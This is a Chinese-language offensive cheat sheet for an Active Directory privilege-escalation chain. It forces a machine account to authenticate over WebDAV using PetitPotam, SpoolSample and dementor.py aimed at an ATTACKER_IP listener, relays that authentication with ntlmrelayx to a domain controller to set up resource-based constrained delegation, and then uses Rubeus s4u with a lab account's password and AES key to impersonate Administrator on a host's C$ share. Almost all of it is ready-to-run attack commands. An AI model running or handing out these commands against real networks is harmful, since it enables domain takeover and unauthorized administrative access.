	可以强制机器帐户对主机进行身份验证，并将其与基于资源的约束委派结合以获得更高的访问权限。它允许攻击者通过 HTTP 而不是 SMB 进行身份验证
	要求：WebClient服务
	禁用 HTTP
	>sudo vi /usr/share/responder/Responder.conf
	生成一个Windows机器名：sudo responder -I eth0，例如：WIN-UBNW4FI3AP0
	准备针对 DC 的 RBCD：
	>python3 ntlmrelayx.py -t ldaps://dc --delegate-access -smb2support
	发现 WebDAV 服务
	>webclientservicescanner 'domain.local'/'user':'password'@'machine'
	>crackmapexec smb 'TARGETS' -d 'domain' -u 'user' -p 'password' -M webdav
	>GetWebDAVStatus.exe 'machine'
	触发身份验证以中继到我们的 nltmrelayx: PetitPotam.exe WIN-UBNW4FI3AP0@80/test.txt 10.0.0.4，必须使用 FQDN 或完整的 netbios 名称指定侦听器主机，例如logger.domain.local@80/test.txt. 指定 IP 会导致匿名身份验证，而不是系统。
	dementor.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
	SpoolSample.exe "ATTACKER_IP" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt"

	#PetitPotam
	Petitpotam.py "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
	Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
	PetitPotam.exe "ATTACKER_NETBIOS_NAME@PORT/randomfile.txt" "ATTACKER_IP"
	使用创建的帐户请求服务票证：
	.\Rubeus.exe hash /domain:purple.lab /user:WVLFLLKZ$ /password:'iUAL)l<i$;UzD7W'
	.\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
	ls \\PC1.purple.lab\c$
	# IP of PC1: 10.0.0.4